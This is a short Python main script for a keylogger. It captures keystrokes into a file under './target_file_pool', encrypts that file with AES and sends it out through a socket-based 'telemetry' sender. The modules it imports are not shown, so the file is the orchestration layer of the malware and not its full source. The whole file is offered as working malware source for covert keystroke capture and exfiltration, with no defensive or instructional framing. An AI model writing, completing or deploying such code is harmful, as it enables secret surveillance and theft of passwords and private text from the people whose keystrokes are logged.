from collector.key_grab import MainGrabber
from encription.AES_encryptor import AESEncription
from telemetry.sockettelemetry import TargetSocketTelemetry
import time

class Main:
    def __init__(self):
        self.time_seconds=1
        self.keyloger_file_path='./target_file_pool/keylog.txt'
        self.encryption_file_path='./target_file_pool/encrypted_file.bin'
        # self.text_file_read_path='./target_file_pool/keylog.txt'
    def main_function(self):
        # Key Grabber
        grabber_instance = MainGrabber(self.keyloger_file_path)
        grabber_instance.listner_method()
        time.sleep(self.time_seconds)
        # Encryption
        encryption_instance = AESEncription(self.encryption_file_path,self.keyloger_file_path)
        encryption_instance.encryption_method()
        time.sleep(self.time_seconds)
        # Telemetry
        target_socket_telemetry_instance = TargetSocketTelemetry()
        target_socket_telemetry_instance.sender()

main = Main()
main.main_function()